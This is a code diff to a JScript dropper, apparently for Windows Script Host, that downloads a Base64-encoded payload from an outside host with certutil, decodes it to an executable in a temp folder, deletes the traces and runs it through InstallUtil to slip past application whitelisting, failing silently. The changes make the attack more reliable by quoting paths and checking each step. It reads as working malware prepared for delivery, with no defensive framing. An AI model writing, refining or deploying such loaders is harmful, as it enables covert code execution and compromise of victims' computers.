@@ -11,6 +11,10 @@
 // certutil which is a monitored LOLBin.
 //
 // Configure the URL below before delivery.
+//
+// FIXED: All paths are quoted (handles usernames with spaces).
+// FIXED: Added -split to certutil -urlcache for reliable downloads.
+// FIXED: Added FileExists checks between steps (skips execute if download/decode fails).
 // =============================================================================
 
 try {
@@ -20,21 +24,29 @@ try {
     var encPath = tmpDir + "\\payload.b64";
     var exePath = tmpDir + "\\svc.exe";
 
-    // ── CONFIG: Set your payload URL ──────────────────────────────────────────
-    var payloadUrl = "http://192.168.1.1/payload.b64";
+    // -- CONFIG: Set your payload URL ------------------------------------------
+    var payloadUrl = "http://192.168.45.221/payload.b64";
 
-    // Download the Base64-encoded payload
-    shell.Run("certutil -urlcache -f " + payloadUrl + " " + encPath, 0, true);
+    // Download the Base64-encoded payload (quoted paths + -split for reliability)
+    shell.Run('certutil -urlcache -f -split "' + payloadUrl + '" "' + encPath + '"', 0, true);
 
-    // Decode Base64 → binary EXE
-    shell.Run("certutil -decode " + encPath + " " + exePath, 0, true);
+    // Verify download succeeded before continuing
+    if (fso.FileExists(encPath)) {
 
-    // Clean up the encoded file
-    try { fso.DeleteFile(encPath); } catch(e) {}
+        // Decode Base64 -> binary EXE (quoted paths)
+        shell.Run('certutil -decode "' + encPath + '" "' + exePath + '"', 0, true);
 
-    // Execute via InstallUtil /U
-    var installUtil = "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe";
-    shell.Run(installUtil + " /U " + exePath, 0, false);
+        // Verify decode succeeded before executing
+        if (fso.FileExists(exePath)) {
+
+            // Clean up the encoded file
+            try { fso.DeleteFile(encPath); } catch(e) {}
+
+            // Execute via InstallUtil /U (quoted paths)
+            var installUtil = "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe";
+            shell.Run('"' + installUtil + '" /U "' + exePath + '"', 0, false);
+        }
+    }
 
 } catch (e) {
     // Silent fail
